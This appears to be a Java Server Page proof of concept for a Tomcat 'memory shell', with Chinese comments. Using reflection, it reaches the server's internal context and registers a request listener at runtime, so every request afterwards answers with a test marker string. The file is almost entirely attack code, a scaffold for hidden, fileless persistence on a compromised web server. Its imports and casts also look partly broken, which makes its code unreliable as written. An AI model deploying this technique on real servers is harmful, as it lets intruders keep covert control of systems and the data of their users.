<%@ page language="java" import="java.lang.reflect.Field javax.servlet.http.HttpServletRequest javax.servlet.http.HttpServletResponse"%>
<%@ page language="java" import="java.io.PrintWriter javax.servlet.ServletContext"%>
<%@ page language="java" import="javax.servlet.ServletRequestListener"%>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.io.PrintWriter" %>
<%
    Field f = request.getClass().getDeclaredField("request");
    f.setAccessible(true);//因为是protected
    HttpServletRequest req = (Request) f.get(request);//反射获取值
    StandardContext context = (StandardContext) req.getContext(); //直接通过request获取StandardContext

    ServletRequestListener listener = new ServletRequestListener() {

        public void requestDestroyed(ServletRequestEvent sre) {
        }

        public void requestInitialized(ServletRequestEvent sre) {
            HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
            try {
                Field reqField = req.getClass().getDeclaredField("request");
                reqField.setAccessible(true);
                // org.apache.catalina.connector.Request
                Object reqObj = reqField.get(req);
                // org.apache.catalina.connector.Response
                HttpServletResponse rep = (HttpServletResponse) reqObj.getClass().getDeclaredMethod("getResponse").invoke(reqObj);
                PrintWriter out = rep.getWriter();
                // rep.sendError(404);
                out.println("listener_xjj_test");
            }catch (Exception e){
                e.printStackTrace();
            }
        }
    };

    context.addApplicationEventListener(listener);

%>